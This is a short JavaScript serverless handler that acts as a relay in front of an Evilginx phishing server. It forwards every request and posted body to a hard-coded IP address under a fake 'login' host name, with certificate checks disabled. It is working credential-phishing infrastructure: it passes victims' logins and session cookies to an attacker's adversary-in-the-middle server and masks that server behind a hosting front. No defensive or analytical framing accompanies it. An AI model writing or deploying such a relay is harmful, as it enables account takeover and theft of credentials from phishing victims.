import http from 'http';
import https from 'https';

export default async function handler(req, res) {
  // Use IP directly with forced HTTPS
  const targetUrl = `https://185.165.171.174${req.url}`;
  
  // PERFECTED HEADERS - exactly what Evilginx expects
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip,
    'X-Real-IP': req.ip
  };

  // Use native Node.js http(s) instead of fetch
  const lib = targetUrl.startsWith('https') ? https : http;
  
  const requestOptions = {
    hostname: '185.165.171.174',
    port: 443,
    path: req.url,
    method: req.method,
    headers: headers,
    rejectUnauthorized: false, // Bypass SSL verification
    timeout: 5000 // 5 second timeout
  };

  try {
    const proxyReq = lib.request(requestOptions, (proxyRes) => {
      // Remove problematic headers
      const headersToKeep = {...proxyRes.headers};
      delete headersToKeep['content-length'];
      delete headersToKeep['transfer-encoding'];
      
      res.writeHead(proxyRes.statusCode || 200, headersToKeep);
      proxyRes.pipe(res);
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy request error:', err);
      res.status(502).send('Bad Gateway');
    });

    // Forward the body if present
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }

  } catch (error) {
    console.error('Proxy setup error:', error);
    res.status(500).send('Internal Server Error');
  }
}
